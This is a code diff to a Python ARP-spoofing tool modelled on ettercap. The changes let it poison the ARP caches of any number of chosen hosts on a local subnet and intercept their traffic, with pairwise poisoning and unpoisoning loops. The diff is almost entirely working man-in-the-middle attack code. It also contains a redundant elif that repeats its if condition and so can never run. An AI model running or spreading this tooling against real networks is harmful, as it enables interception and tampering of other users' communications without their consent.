@@ -13,9 +13,9 @@ START_INTERVAL = 1 # ettercap sends packets every second
 MIDDLE_INTERVAL = 20 # ettercap sends packets every 10 seconds
 END_INTERVAL = 1 # ettercap sends packets every second
 
-ONE_WAY_TOKEN = "ONE_WAY_TOKEN_abfjdfsldf"
+ONE_WAY_TOKEN = "__ONE_WAY_TOKEN__"
 
-def arp(gratuitious, verbose):
+def arp_spoofing(gratuitious, verbose):
     if verbose:
         conf.verb = 0
 
@@ -27,33 +27,50 @@ def arp(gratuitious, verbose):
 
     iface, previous_tuples = spoof.get_interface(previous_tuples)
 
-    previous_tuples.append(["Searching for active hosts in the subnet..."])
-    previous_tuples.append([""])
-
     spoof.print_previous(previous_tuples, True)
 
     active_hosts, previous_tuples = sh.search_hosts(iface, [])
 
-    spoof.printf("")
-    previous_tuples.append([""])
-    spoof.printf("Input IP address of the first target out of the active hosts:", 1)
-    previous_tuples.append(["Input IP address of the first target out of the active hosts:", 1])
-    
-    first_target = spoof.validate_ip(active_hosts, "", previous_tuples)
-    previous_tuples.append([first_target["ip"], 7])
-    
-    spoof.printf("")
-    previous_tuples.append([""])
-    spoof.printf("Input IP address of the second target out of the active hosts("+str(1)+"-"+str(len(active_hosts))+"):", 1)
-    previous_tuples.append(["Input IP address of the second target out of the active hosts("+str(1)+"-"+str(len(active_hosts))+"):", 1])
-    
-    second_target = spoof.validate_ip(active_hosts, first_target["ip"], previous_tuples)
+    targets, previous_tuples = choose_arp_targets(active_hosts, previous_tuples)
 
     my_details = sh.get_my_details(iface)
-    targets = [(first_target["mac"], first_target["ip"]), (second_target["mac"], second_target["ip"])]
-    arp_spoofing(targets, my_details["mac"], my_details["ip"], iface, gratuitious)
+    two_way_arp_procedure(targets, my_details["mac"], my_details["ip"], iface, gratuitious)
 
-def arp_spoofing(targets, macAtk, ipAtk, iface, gratuitious):
+def choose_arp_targets(active_hosts, previous_tuples):
+    spoof.printf("")
+    previous_tuples.append([""])
+    spoof.printf("Input number of targets for the attack:", 1)
+    previous_tuples.append(["Input number of targets for the attack:", 1])
+
+    num_targets = int(spoof.inputf(previous_tuples))
+    previous_tuples.append([str(num_targets), 7])
+
+    if num_targets < 2 or num_targets > len(active_hosts):
+        spoof.printf("Invalid number of targets specified! Defaulting to 2.", 2)
+        num_targets = 2
+
+    targets = []
+    past_ips = []
+    for i in range(num_targets):
+        spoof.printf("")
+        previous_tuples.append([""])
+
+        if i == 0:
+            spoof.printf("Input IP address of the first target out of the active hosts:", 1)
+            previous_tuples.append(["Input IP address of the first target out of the active hosts:", 1])
+        else:
+            spoof.printf("Input IP address of the next target out of the active hosts:", 1)
+            previous_tuples.append(["Input IP address of the next target out of the active hosts:", 1])
+        
+        curr_target = spoof.validate_ip(active_hosts, past_ips, previous_tuples)
+        previous_tuples.append([curr_target["ip"], 7])
+
+        targets.append((curr_target['mac'], curr_target['ip']))
+        past_ips.append(curr_target["ip"])
+
+    return targets, previous_tuples
+
+def two_way_arp_procedure(targets, macAtk, ipAtk, iface, gratuitious):
     spoof.clear()
     spoof.printf("Spoofing the connection between", 0)
 
@@ -78,7 +95,6 @@ def arp_spoofing(targets, macAtk, ipAtk, iface, gratuitious):
     spoof.printf("Stopping poisoning!!! (Do not kill the program)", 4)
     poison_m_times_every_n_secs(END_COUNT, END_INTERVAL, time.time() - END_INTERVAL, False, targets, macAtk, ipAtk, iface, 2)
 
-
 def one_way_arp_start(macT1, ipT1, ipT2, macAtk, ipAtk, iface):
     targets = [(macT1, ipT1), (ONE_WAY_TOKEN, ipT2)]
     poison_m_times_every_n_secs(START_COUNT, START_INTERVAL, time.time() - START_INTERVAL, True, targets, macAtk, ipAtk, iface, 1)
@@ -102,8 +118,8 @@ def poison_m_times_every_n_secs(m, n, last_sent_time, should_poison, targets, ma
             m -= 1
     
 def arp_poison(targets, macAtk, ipAtk, iface, pkt_type, gratuitious):
-    for i in range(len(targets)):
-        for j in range(i,len(targets)):
+    for i in range(len(targets) - 1):
+        for j in range(i + 1, len(targets)):
             macT1 = targets[i][0]
             ipT1  = targets[i][1]            
             macT2 = targets[j][0]
@@ -116,14 +132,22 @@ def arp_poison(targets, macAtk, ipAtk, iface, pkt_type, gratuitious):
             else:
                 send_bi_directional(ipT2, macT2, ipT1, macT1, macAtk, macAtk, iface, pkt_type, gratuitious)
 
-def arp_unpoison(macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, pkt_type):
+def arp_unpoison(targets, macAtk, ipAtk, iface, pkt_type):
     gratuitious = False
-    if macAtk == ONE_WAY_TOKEN:
-        send_one_directional(macT1, ipT1, ipT2, macT2, iface, pkt_type, gratuitious)
-    elif macAtk == ONE_WAY_TOKEN:
-        send_one_directional(macT2, ipT2, ipT1, macT1, iface, pkt_type, gratuitious)
-    else:
-        send_bi_directional(ipT2, macT2, ipT1, macT1, macT2, macT1, iface, pkt_type, gratuitious)    
+
+    for i in range(len(targets) - 1):
+        for j in range(i + 1, len(targets)):
+            macT1 = targets[i][0]
+            ipT1  = targets[i][1]            
+            macT2 = targets[j][0]
+            ipT2  = targets[j][1]
+
+            if macAtk == ONE_WAY_TOKEN:
+                send_one_directional(macT1, ipT1, ipT2, macT2, iface, pkt_type, gratuitious)
+            elif macAtk == ONE_WAY_TOKEN:
+                send_one_directional(macT2, ipT2, ipT1, macT1, iface, pkt_type, gratuitious)
+            else:
+                send_bi_directional(ipT2, macT2, ipT1, macT1, macT2, macT1, iface, pkt_type, gratuitious)    
 
 def send_one_directional(_macT1, _ipT1, _ipT2, _macAtk, _iface, pkt_type, gratuitious):
     # poison ARP table of the target
